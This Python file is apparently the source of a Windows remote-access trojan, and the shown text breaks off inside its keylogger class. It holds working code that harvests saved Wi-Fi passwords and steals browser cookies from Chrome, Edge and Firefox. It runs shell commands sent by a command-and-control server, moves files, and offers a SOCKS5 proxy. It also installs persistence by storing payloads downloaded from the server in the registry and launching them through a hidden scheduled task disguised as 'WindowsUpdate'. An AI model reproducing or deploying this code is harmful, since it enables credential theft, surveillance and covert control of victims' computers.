import sys
import subprocess
import platform
from datetime import datetime, timedelta

def install_module(module_name, pip_name=None):
    """Helper function to install missing modules"""
    pip_name = pip_name or module_name
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
        print(f"Successfully installed {module_name}")
        return True
    except subprocess.CalledProcessError:
        print(f"Failed to install {module_name}")
        return False

# List of required modules with their pip names if different
required_modules = [
    ('urllib3', None),
    ('Crypto', 'pycryptodome'),
    ('requests', None),
    ('pyautogui', None),
    ('psutil', None),
    ('keyboard', 'pynput'),
    ('socketio', 'python-socketio'),
    ('websocket', 'websocket-client')
]

# Check and install missing modules
for module, pip_name in required_modules:
    try:
        if module == 'wintypes':
            import ctypes
            from ctypes import wintypes
        elif module == 'datetime':
            from datetime import datetime, timedelta
        elif module == 'xml.etree.ElementTree':
            import xml.etree.ElementTree as ET
        elif module == 'Crypto':
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad
        elif module == 'keyboard':
            from pynput import keyboard
        else:
            __import__(module.split('.')[0])
    except ImportError:
        print(f"Module {module} not found. Attempting to install...")
        if pip_name:
            install_module(module, pip_name)
        else:
            install_module(module)

# Now proceed with the imports
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    import os
    import sys
    import json
    import base64
    import sqlite3
    import time
    import platform
    import subprocess
    import random
    import io
    import logging
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import requests
    import pyautogui
    if platform.system() == 'Windows':
        import winreg
        from ctypes import wintypes
    import shutil
    import ctypes
    import psutil
    import socket
    import threading
    import select
    from pynput import keyboard
    import configparser
    import xml.etree.ElementTree as ET
    import socketio
    import websocket
    import tempfile
    import multiprocessing
  
    
    print("All modules imported successfully!")
except ImportError as e:
    print(f"Failed to import module: {e}")
    


# ======================
# Configuration
# ======================
class Config:
    def __init__(self):
        self.C2_SERVER = "https://172.16.25.1"
        self.AES_KEY = b"32bytekey-ultra-secure-123456789"
        self.AES_IV = b"16byteiv-9876543"
        self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.CHECKIN_INTERVAL = 10
        self.SOCKS5_PORT = 1080
        self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
        self.DEBUG = True
        self.TAKE_SCREENSHOTS = False
        self.SCREENSHOT_FREQUENCY = 30
        self.KILLDATE_ENABLED = False
        self.KILLDATE = "" if False else ""


# ======================
# Encryption
# ======================
class Crypto:
    def __init__(self, key, iv):
        if len(key) not in {16, 24, 32}:
            raise ValueError(f"Invalid AES key length ({len(key)} bytes)")
        if len(iv) != 16:
            raise ValueError(f"Invalid AES IV length ({len(iv)} bytes)")
        self.key = key
        self.iv = iv

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(json.dumps(data).encode(), AES.block_size)
        ct_bytes = cipher.encrypt(padded_data)
        return base64.b64encode(ct_bytes).decode()

    def decrypt(self, enc_data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        ct = base64.b64decode(enc_data)
        pt = cipher.decrypt(ct)
        return json.loads(unpad(pt, AES.block_size))

# ======================
# Credential Harvester
# ======================
class CredentialHarvester:
    @staticmethod
    def get_wifi_passwords():
        try:
            profiles = []
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
            profiles = [line.split(":")[1].strip() for line in results if "All User Profile" in line]
            
            wifi_passwords = []
            for profile in profiles:
                try:
                    password_result = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                    ).decode('utf-8', errors='ignore').split('\n')
                    password = [line.split(":")[1].strip() for line in password_result if "Key Content" in line][0]
                    wifi_passwords.append({
                        "ssid": profile,
                        "password": password
                    })
                except:
                    continue
            
            return wifi_passwords
        except:
            return []

# ======================
# Cookie Stealer
# ======================
class CookieStealer:
    def __init__(self, logger=None):
        self.logger = logger or self._create_default_logger()
        self.chrome_debug_port = 9222
        self.edge_debug_port = 9223
        self.timeout = 10
        self.unique_domains = set()
        
        # Browser configurations
        self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
        self.CHROME_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Google\Chrome\User Data'
        self.CHROME_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'chrome_cookies.json')

        self.EDGE_PATH = rf"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        self.EDGE_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Microsoft\Edge\User Data'
        self.EDGE_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'edge_cookies.json')

        self.FIREFOX_PROFILE_DIR = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')

    def steal_cookies(self):
        """Main method to steal cookies from all browsers"""
        results = []
        
        # Chrome
        chrome_data = self._process_browser_cookies(
            'chrome',
            self.CHROME_PATH,
            self.chrome_debug_port,
            self.CHROME_USER_DATA_DIR
        )
        if chrome_data:
            results.append(chrome_data)
        
        # Edge
        edge_data = self._process_browser_cookies(
            'edge',
            self.EDGE_PATH,
            self.edge_debug_port,
            self.EDGE_USER_DATA_DIR
        )
        if edge_data:
            results.append(edge_data)
        
        # Firefox
        firefox_data = self._process_firefox_cookies()
        if firefox_data:
            results.append(firefox_data)
        
        return results

    def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
        """Process Chrome/Edge cookies"""
        try:
            self._log('info', f"Processing {browser_name} cookies")
            
            # Start browser in debug mode
            proc = self._start_browser_debug(browser_path, port, user_data_dir)
            if not proc:
                return None

            # Wait for browser to start
            time.sleep(5)
            
            # Get cookies via debug protocol
            cookies = self._get_cookies_via_debug(port)
            
            # Clean up browser process
            proc.terminate()
            proc.wait()

            if not cookies:
                return None

            # Transform cookies to standard format
            transformed = self._transform_cookies(cookies)
            
            # Package cookies for transmission
            return self._package_cookies(transformed, browser_name)

        except Exception as e:
            self._log('error', f"{browser_name} cookie processing failed: {str(e)}")
            return None

    def _process_firefox_cookies(self):
        """Process Firefox cookies"""
        try:
            self._log('info', "Processing Firefox cookies")
            
            # Find Firefox profile
            profile_dir = self._find_firefox_profile()
            if not profile_dir:
                return None

            # Extract cookies from SQLite database
            cookies = self._extract_firefox_cookies(profile_dir)
            if not cookies:
                return None

            # Transform to standard format
            transformed = self._transform_cookies(cookies)
            
            # Package for transmission
            return self._package_cookies(transformed, 'firefox')

        except Exception as e:
            self._log('error', f"Firefox cookie processing failed: {str(e)}")
            return None

    def _transform_cookies(self, cookies):
        """Transform cookies into standard format with corrected sameSite values"""
        transformed = []
        for cookie in cookies:
            if len(cookie) == 8:  # Firefox cookies
                name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
            else:  # Chrome/Edge cookies
                name = cookie['name']
                value = cookie['value']
                domain = cookie['domain']
                path = cookie['path']
                expiry = cookie.get('expires', 0)
                is_secure = cookie.get('secure', False)
                is_http_only = cookie.get('httpOnly', False)
                same_site = cookie.get('sameSite', 'unspecified')
            
            # Fix sameSite values to match allowed options
            if same_site.lower() == 'none':
                same_site = 'no_restriction'
            elif same_site.lower() == 'lax':
                same_site = 'lax'
            elif same_site.lower() == 'strict':
                same_site = 'strict'
            else:
                same_site = 'unspecified'  # default if not matching any known value
            
            transformed_cookie = {
                "domain": domain,
                "expirationDate": expiry,
                "hostOnly": not domain.startswith('.'),
                "httpOnly": bool(is_http_only),
                "name": name,
                "path": path,
                "sameSite": same_site,
                "secure": bool(is_secure),
                "session": expiry == 0,
                "storeId": "0",
                "value": value
            }
            transformed.append(transformed_cookie)
        return transformed

    def _create_junctions(self):
        """Create junctions for Chrome and Edge user data directories"""
        temp_dir = os.getenv('TEMP')
        chrome_junction = os.path.join(temp_dir, 'g')
        edge_junction = os.path.join(temp_dir, 'e')

        # Remove existing junctions if they exist
        for junction in [chrome_junction, edge_junction]:
            if os.path.exists(junction):
                try:
                    if os.path.isdir(junction):
                        subprocess.run(['cmd', '/c', 'rmdir', junction], check=True)
                    else:
                        os.remove(junction)
                except Exception as e:
                    self._log('error', f"Failed to remove existing junction {junction}: {str(e)}")

        # Create junctions using mklink /j
        try:
            subprocess.check_call(f'mklink /j "{chrome_junction}" "{self.CHROME_USER_DATA_DIR}"', shell=True)
            self._log('info', f"Created junction {chrome_junction} -> {self.CHROME_USER_DATA_DIR}")
        except Exception as e:
            self._log('error', f"Failed to create junction for Chrome: {str(e)}")

        try:
            subprocess.check_call(f'mklink /j "{edge_junction}" "{self.EDGE_USER_DATA_DIR}"', shell=True)
            self._log('info', f"Created junction {edge_junction} -> {self.EDGE_USER_DATA_DIR}")
        except Exception as e:
            self._log('error', f"Failed to create junction for Edge: {str(e)}")

        return chrome_junction, edge_junction

    def _start_browser_debug(self, browser_path, port, user_data_dir):
        """Start browser in debug mode"""
        try:
            self._kill_browser(os.path.basename(browser_path))

            # Create junctions and use them if user_data_dir matches Chrome or Edge paths
            chrome_junction, edge_junction = self._create_junctions()
            if user_data_dir == self.CHROME_USER_DATA_DIR:
                user_data_dir = chrome_junction
            elif user_data_dir == self.EDGE_USER_DATA_DIR:
                user_data_dir = edge_junction

            command = [
                browser_path,
                f'--remote-debugging-port={port}',
                '--remote-allow-origins=*',
                '--no-first-run',
                '--no-default-browser-check',
                '--headless',
                f'--user-data-dir={user_data_dir}'
            ]
            return subprocess.Popen(command, 
                                  stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)
        except Exception as e:
            self._log('error', f"Failed to start browser: {str(e)}")
            return None

    def _kill_browser(self, process_name):
        """Kill browser process if running"""
        try:
            subprocess.run(f'taskkill /F /IM {process_name}', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    def _get_cookies_via_debug(self, port):
        """Get cookies using Chrome DevTools Protocol"""
        try:
            debug_url = f'http://localhost:{port}/json'
            response = requests.get(debug_url, timeout=self.timeout)
            response.raise_for_status()
            
            data = response.json()
            if not data:
                return []
                
            ws_url = data[0]['webSocketDebuggerUrl']
            ws = websocket.create_connection(ws_url, timeout=self.timeout)
            
            ws.send(json.dumps({
                'id': 1,
                'method': 'Network.getAllCookies'
            }))
            
            response = json.loads(ws.recv())
            return response['result']['cookies']
        except Exception as e:
            self._log('error', f"Debug protocol error: {str(e)}")
            return []
        finally:
            if 'ws' in locals():
                ws.close()

    def _find_firefox_profile(self):
        """Find Firefox profile directory"""
        try:
            for profile in os.listdir(self.FIREFOX_PROFILE_DIR):
                if profile.endswith('.default-release'):
                    return os.path.join(self.FIREFOX_PROFILE_DIR, profile)
            return None
        except Exception as e:
            self._log('error', f"Failed to find Firefox profile: {str(e)}")
            return None

    def _extract_firefox_cookies(self, profile_dir):
        """Extract cookies from Firefox SQLite database"""
        try:
            cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
            if not os.path.exists(cookies_db):
                return []
                
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()
            
            # Modified query to ensure all fields are properly handled
            cursor.execute("""
                SELECT 
                    CAST(name AS TEXT) as name,
                    CAST(value AS TEXT) as value,
                    CAST(host AS TEXT) as host,
                    CAST(path AS TEXT) as path,
                    CAST(expiry AS INTEGER) as expiry,
                    CAST(isSecure AS INTEGER) as isSecure,
                    CAST(isHttpOnly AS INTEGER) as isHttpOnly,
                    CAST(sameSite AS INTEGER) as sameSite 
                FROM moz_cookies
            """)
            
            cookies = []
            for row in cursor.fetchall():
                try:
                    # Ensure all values are properly converted
                    cookies.append((
                        str(row[0]),  # name
                        str(row[1]),  # value
                        str(row[2]),  # host
                        str(row[3]),  # path
                        int(row[4]) if row[4] else 0,  # expiry
                        bool(row[5]),  # isSecure
                        bool(row[6]),  # isHttpOnly
                        str(row[7]) if row[7] else 'none'  # sameSite
                    ))
                except Exception as e:
                    self._log('error', f"Error processing Firefox cookie: {str(e)}")
                    continue
            
            conn.close()
            return cookies
        except Exception as e:
            self._log('error', f"Failed to extract Firefox cookies: {str(e)}")
            return []

    def _get_system_info(self):
        """Get system information."""
        try:
            ip_info = requests.get('https://ipinfo.io', timeout=5).json()
            return {
                'ip_address': ip_info.get('ip', 'Unknown'),
                'location': f"{ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}",
                'username': os.getenv('USERNAME'),
                'computer_name': os.getenv('COMPUTERNAME'),
                'windows_version': platform.version(),
                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
            }
        except Exception as e:
            return {
                'ip_address': 'Unknown',
                'location': 'Unknown',
                'username': 'Unknown',
                'computer_name': 'Unknown',
                'windows_version': 'Unknown',
                'user_agent': 'Unknown'
            }

    def _extract_unique_domains(self, cookies):
        """Extract unique domains from cookies."""
        unique_domains = set()
        for cookie in cookies:
            domain = cookie.get('domain', '')
            if domain:
                unique_domains.add(domain)
        return list(unique_domains)

    def _package_cookies(self, cookies, browser_name):
        """Package cookies into base64 encoded JSON with system info"""
        try:
            if not cookies:
                return None
                
            # Extract unique domains
            unique_domains = self._extract_unique_domains(cookies)
            self.unique_domains.update(unique_domains)
            
            # Get system info
            system_info = self._get_system_info()
            
            # Create temporary file
            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer')
            os.makedirs(temp_dir, exist_ok=True)
            
            temp_file = os.path.join(temp_dir, f'{browser_name}_cookies.json')
            with open(temp_file, 'w') as f:
                json.dump(cookies, f, indent=4)
            
            # Read file content
            with open(temp_file, 'rb') as f:
                cookie_data = f.read()
            
            # Clean up
            os.remove(temp_file)
            
            return {
                'browser': browser_name,
                'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
                'system_info': {
                    **system_info,
                    'unique_domains': unique_domains,
                    'all_domains': list(self.unique_domains)
                }
            }
        except Exception as e:
            self._log('error', f"Failed to package {browser_name} cookies: {str(e)}")
            return None

    def _create_default_logger(self):
        logger = logging.getLogger('CookieStealer')
        if not logger.handlers:
            handler = logging.StreamHandler()
            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    def _log(self, level, message):
        if self.logger:
            getattr(self.logger, level)(message)

# ======================
# System Functions
# ======================
class SystemUtils:
    @staticmethod
    def take_screenshot():
        logger = logging.getLogger('SystemUtils')
        try:
            logger.debug("Attempting to take screenshot")
            
            # Handle Windows display environment if needed
            if platform.system() == 'Windows':
                logger.debug("Windows system detected, setting DISPLAY environment")
                os.environ['DISPLAY'] = ':0.0'
            
            logger.debug("Capturing screen with pyautogui")
            screenshot = pyautogui.screenshot()
            
            logger.debug("Converting screenshot to bytes buffer")
            buffered = io.BytesIO()
            screenshot.save(buffered, format="PNG")
            buffered.seek(0)
            
            logger.debug("Encoding screenshot to base64")
            screenshot_data = base64.b64encode(buffered.read()).decode('utf-8')
            
            logger.debug("Screenshot captured and encoded successfully")
            return screenshot_data
            
        except ImportError as e:
            logger.error(f"Required library not available: {str(e)}", exc_info=True)
            return None
        except PermissionError as e:
            logger.error(f"Permission denied when taking screenshot: {str(e)}", exc_info=True)
            return None
        except Exception as e:
            logger.error(f"Unexpected error during screenshot capture: {str(e)}", exc_info=True)
            return None
    @staticmethod
    def get_system_info():
        try:
            info = {
                "hostname": platform.node(),
                "username": os.getlogin(),
                "os": platform.platform(),
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "ram": round(psutil.virtual_memory().total / (1024**3), 2),
                "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
                "processes": []
            }

            for proc in sorted(psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']), 
                             key=lambda p: p.info['cpu_percent'], reverse=True)[:10]:
                info["processes"].append({
                    "pid": proc.info['pid'],
                    "name": proc.info['name'],
                    "user": proc.info['username'],
                    "cpu": proc.info['cpu_percent']
                })

            return info
        except:
            return {}

    @staticmethod
    def execute_command(cmd):
        try:
            result = subprocess.run(cmd, shell=True, 
                                  capture_output=True, text=True, 
                                  timeout=30)
            return {
                "output": result.stdout,
                "error": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                "error": "Command timed out after 30 seconds",
                "returncode": -1
            }
        except Exception as e:
            return {
                "error": str(e),
                "returncode": -1
            }

    @staticmethod
    def upload_file(filepath):
        try:
            if not os.path.exists(filepath):
                return {"error": "File not found"}
            
            if os.path.getsize(filepath) > Config.MAX_UPLOAD_SIZE:
                return {"error": "File too large"}
            
            with open(filepath, "rb") as f:
                file_data = f.read()
            
            return {
                "filename": os.path.basename(filepath),
                "data": base64.b64encode(file_data).decode('utf-8'),
                "size": len(file_data)
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def download_file(filename, data):
        try:
            file_data = base64.b64decode(data)
            downloads_dir = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
            filepath = os.path.join(downloads_dir, filename)
            
            counter = 1
            while os.path.exists(filepath):
                name, ext = os.path.splitext(filename)
                filepath = os.path.join(downloads_dir, f"{name}_{counter}{ext}")
                counter += 1
            
            with open(filepath, "wb") as f:
                f.write(file_data)
            
            return {"status": "success", "path": filepath}
        except Exception as e:
            return {"error": str(e)}

# ======================
# Persistence
# ======================
class Persistence:
    @staticmethod
    def _download_to_registry(url, value_name, c2_server):
        logger = logging.getLogger('agent.persistence.download')
        try:
            logger.info(f"Attempting to download content from {url}")
            response = requests.get(url, verify=False)
            response.raise_for_status()
            logger.debug(f"Successfully downloaded {len(response.content)} bytes")
            
            # More reliable admin check
            is_admin = False
            try:
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                logger.debug(f"Admin privileges: {is_admin}")
            except Exception as e:
                logger.debug(f"Admin check failed: {str(e)}")
                # Fallback method
                try:
                    test_key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
                        0,
                        winreg.KEY_WRITE | winreg.KEY_READ
                    )
                    winreg.CloseKey(test_key)
                    is_admin = True
                except WindowsError:
                    is_admin = False
            
            reg_path = (r"SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo" if is_admin 
                    else r"Software\Microsoft\Accessibility\Setup")
            root_key = winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER
            
            logger.info(f"Storing {value_name} in registry at {root_key}\\{reg_path}")
            
            try:
                # Ensure we have write permissions by using correct access flags
                access = winreg.KEY_WRITE | winreg.KEY_READ
                key = winreg.CreateKeyEx(root_key, reg_path, 0, access)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_BINARY, response.content)
                winreg.CloseKey(key)
                logger.info(f"Successfully stored {value_name} in registry")
                return True
            except Exception as e:
                logger.error(f"Failed to write to registry: {str(e)}")
                return False
                
        except requests.RequestException as e:
            logger.error(f"Download failed: {str(e)}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error in _download_to_registry: {str(e)}", exc_info=True)
            return False

    @staticmethod
    def _generate_batch_runner():
        logger = logging.getLogger('agent.persistence.generator')
        try:
            batch_lines = [
                '@echo off',
                'setlocal enabledelayedexpansion',
                '',
                ':: Configure paths',
                'set "extract_root=%public%"',
                'set "python_dir=%extract_root%\\documents"',
                'set "python_exe=%python_dir%\\python.exe"',
                'set "py_script=%python_dir%\\run_lube.py"',
                '',
                'if exist "%python_exe%" (',
                '    goto HavePython',
                ')',
                '',
                'set "ps_command=$ErrorActionPreference = \'Stop\';"',
                'set "ps_command=%ps_command% $regPaths = @(\'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\',\'HKCU:\\Software\\Microsoft\\Accessibility\\Setup\');"',
                'set "ps_command=%ps_command% foreach ($path in $regPaths) {"',
                'set "ps_command=%ps_command%     if (Test-Path $path) {"',
                'set "ps_command=%ps_command%         $val = Get-ItemProperty -Path $path -Name \'engine\' -ErrorAction SilentlyContinue;"',
                'set "ps_command=%ps_command%         if ($val -and $val.engine) {"',
                'set "ps_command=%ps_command%             $zipPath = Join-Path $env:TEMP \'python_engine.zip\';"',
                'set "ps_command=%ps_command%             [IO.File]::WriteAllBytes($zipPath, $val.engine);"',
                'set "ps_command=%ps_command%             $extractTo = \'%extract_root%\';"',
                'set "ps_command=%ps_command%             if (-not (Test-Path $extractTo)) { New-Item -Path $extractTo -ItemType Directory -Force | Out-Null };"',
                'set "ps_command=%ps_command%             Expand-Archive -Path $zipPath -DestinationPath $extractTo -Force;"',
                'set "ps_command=%ps_command%             Remove-Item $zipPath -Force;"',
                'set "ps_command=%ps_command%             $pythonPath = Join-Path $extractTo \'documents\\python.exe\';"',
                'set "ps_command=%ps_command%             if (Test-Path $pythonPath) { exit 0 }"',
                'set "ps_command=%ps_command%         }"',
                'set "ps_command=%ps_command%     }"',
                'set "ps_command=%ps_command% };"',
                'set "ps_command=%ps_command% throw \'Failed to extract Python from registry\'"',
                '',
                'powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_command%"',
                'if errorlevel 1 (',
                '    echo ERROR: Failed to extract Python from registry',
                '    pause',
                '    exit /b 1',
                ')',
                '',
                ':HavePython',
                '',
                '(',
                'echo import winreg',
                'echo import sys',
                'echo.',
                'echo try:',
                'echo     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r\'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\'^)',
                'echo     value, regtype = winreg.QueryValueEx(key, \'lube\'^)',
                'echo     script = value.decode(\'utf-8\'^) if regtype == winreg.REG_BINARY else value',
                'echo     exec(script^)',
                'echo except Exception as e:',
                'echo     print(f\'Error: {e}\'^)',
                'echo     sys.exit(1^)',
                ') > "%py_script%" 2>nul',
                '',
                '"%python_exe%" "%py_script%"',
                'if errorlevel 1 (',
                '    echo ERROR: Python script execution failed',
                '    pause',
                '    exit /b 1',
                ')',
                '',
                'endlocal'
            ]
            
            batch_code = '\r\n'.join(batch_lines)
            return base64.b64encode(batch_code.encode('utf-8')).decode('utf-8')
        except Exception as e:
            logger.error(f"Failed to generate batch runner: {str(e)}", exc_info=True)
            raise

    @staticmethod
    def _create_scheduled_task():
        logger = logging.getLogger('agent.persistence.task')
        try:
            # Check admin status
            is_admin = False
            try:
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                logger.debug(f"Admin privileges: {is_admin}")
            except Exception as e:
                logger.debug(f"Admin check failed: {str(e)}")
                try:
                    test_key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
                        0,
                        winreg.KEY_WRITE | winreg.KEY_READ
                    )
                    winreg.CloseKey(test_key)
                    is_admin = True
                except WindowsError:
                    is_admin = False

            task_name = "WindowsUpdate"
            logger.debug(f"Generated task name: {task_name}")
            
            encoded_batch = Persistence._generate_batch_runner()
            logger.debug("Successfully generated encoded batch runner")
            
            # Create batch file in Public directory
            batch_path = os.path.join(os.getenv('PUBLIC'), "documents", "runner.cmd")
            logger.debug(f"Writing batch runner to {batch_path}")
            
            decoded_batch = base64.b64decode(encoded_batch).decode('utf-8')
            with open(batch_path, 'w') as f:
                f.write(decoded_batch)
            
            logger.info(f"Batch runner created at {batch_path}")

            # Different approach for non-admin users
            if not is_admin:
                logger.info("Running as non-admin, using alternate persistence method")
                
                # Create registry run key instead of scheduled task
                try:
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, f'conhost --headless cmd /c "{batch_path}"')
                    winreg.CloseKey(key)
                    logger.info(f"Created Run registry key for current user")
                    return task_name
                except Exception as e:
                    logger.error(f"Failed to create Run registry key: {str(e)}")
                    return None

            # Admin task creation (original code)
            task_xml_lines = [
                '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
                '    <Triggers>',
                '        <LogonTrigger>',
                '            <Enabled>true</Enabled>',
                '        </LogonTrigger>',
                '    </Triggers>',
                '    <Principals>',
                '        <Principal id="Author">',
                '            <RunLevel>HighestAvailable</RunLevel>',
                '        </Principal>',
                '    </Principals>',
                '    <Settings>',
                '        <Hidden>true</Hidden>',
                '        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>',
                '    </Settings>',
                '    <Actions Context="Author">',
                '        <Exec>',
                '            <Command>conhost</Command>',
                f'            <Arguments>--headless cmd /c "{batch_path}"</Arguments>',
                '        </Exec>',
                '    </Actions>',
                '</Task>'
            ]
            
            xml_path = os.path.join(os.getenv('TEMP'), f'task_{random.randint(1000,9999)}.xml')
            logger.debug(f"Writing task XML to {xml_path}")
            
            with open(xml_path, 'w') as f:
                f.write("\n".join(task_xml_lines))
            
            logger.info(f"Creating scheduled task '{task_name}'")
            result = subprocess.run(
                ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                logger.info(f"Successfully created task '{task_name}'")
            else:
                logger.error(f"Failed to create task. STDOUT: {result.stdout} STDERR: {result.stderr}")
                return None
            
            return task_name
        except Exception as e:
            logger.error(f"Failed to create scheduled task: {str(e)}", exc_info=True)
            return None
        finally:
            try:
                if 'xml_path' in locals() and os.path.exists(xml_path):
                    os.remove(xml_path)
                    logger.debug(f"Cleaned up temporary XML file: {xml_path}")
            except Exception as e:
                logger.error(f"Failed to clean up XML file: {str(e)}")

    @staticmethod
    def install(c2_server):
        logger = logging.getLogger('agent.persistence.install')
        try:
            logger.info(f"Starting persistence installation with C2: {c2_server}")
            
            if platform.system() != "Windows":
                logger.error("Non-Windows platform detected")
                return {"status": "error", "message": "Only Windows supported"}
            
            logger.info("Downloading and storing engine (Python package)")
            if not Persistence._download_to_registry(f"{c2_server}//a/p", "engine", c2_server):
                logger.error("Failed to store engine in registry")
                return {"status": "error", "message": "Failed to store engine in registry"}
            
            logger.info("Downloading and storing lube (Python script)")
            if not Persistence._download_to_registry(f"{c2_server}//a/d", "lube", c2_server):
                logger.error("Failed to store lube in registry")
                return {"status": "error", "message": "Failed to store lube in registry"}
            
            logger.info("Creating scheduled task")
            task_name = Persistence._create_scheduled_task()
            if not task_name:
                logger.error("Failed to create scheduled task")
                return {"status": "error", "message": "Failed to create scheduled task"}
            
            success_msg = "Persistence installed successfully"
            logger.info(success_msg)
            return {
                "status": "success", 
                "message": success_msg,
                "registry_entries": ["engine", "lube"],
                "task_name": task_name,
                "extraction_path": r"%PUBLIC%\documents",
                "execution_method": "python_from_registry"
            }
            
        except Exception as e:
            logger.error(f"Installation failed: {str(e)}", exc_info=True)
            return {"status": "error", "message": str(e)}
        



# ======================
# SOCKS5 Proxy
# ======================
class SOCKS5Proxy:
    def __init__(self, port):
        self.port = port
        self.running = False
        self.server_socket = None
        self.connections = {}

    def start(self):
        if self.running:
            return {"status": "error", "message": "Proxy already running"}
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('127.0.0.1', self.port))
            self.server_socket.listen(5)
            self.running = True
            
            threading.Thread(target=self._accept_connections, daemon=True).start()
            return {"status": "success", "message": f"SOCKS5 proxy started on port {self.port}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        return {"status": "success", "message": "SOCKS5 proxy stopped"}

    def _accept_connections(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                threading.Thread(
                    target=self._handle_client,
                    args=(conn, addr),
                    daemon=True
                ).start()
            except:
                break

    def _handle_client(self, conn, addr):
        try:
            conn.recv(256)
            conn.sendall(b"\x05\x00")
            
            request = conn.recv(4)
            if request[0] != 0x05 or request[1] != 0x01:
                conn.close()
                return
            
            addr_type = request[3]
            if addr_type == 0x01:
                target_host = socket.inet_ntoa(conn.recv(4))
            elif addr_type == 0x03:
                length = ord(conn.recv(1))
                target_host = conn.recv(length).decode()
            else:
                conn.close()
                return
            
            target_port = int.from_bytes(conn.recv(2), 'big')
            
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.connect((target_host, target_port))
            
            conn.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (self.port).to_bytes(2, 'big'))
            
            self._relay_data(conn, target_sock)
        except Exception as e:
            pass
        finally:
            conn.close()

    def _relay_data(self, client_sock, target_sock):
        sockets = [client_sock, target_sock]
        while self.running:
            try:
                read_sockets, _, _ = select.select(sockets, [], [], 1)
                for sock in read_sockets:
                    data = sock.recv(4096)
                    if not data:
                        return
                    
                    if sock == client_sock:
                        target_sock.sendall(data)
                    else:
                        client_sock.sendall(data)
            except:
                break

# ======================
# Keylogger
# ======================
import threading

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.running = threading.Event()
        self.ws_client = None
        self.lock = threading.Lock()
        self.batch_size = 50
        self.batch_interval = 5  # seconds
        self._last_send_time = 0
        self.logger = logging.getLogger('keylogger')
        if not self.logger.hasHandlers():
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
            self.logger.setLevel(logging.DEBUG)

    def start(self):
        if self.running.is_set():
            self.logger.debug("Keylogger start called but already running")
            return {"status": "error", "message": "Keylogger already running"}
        
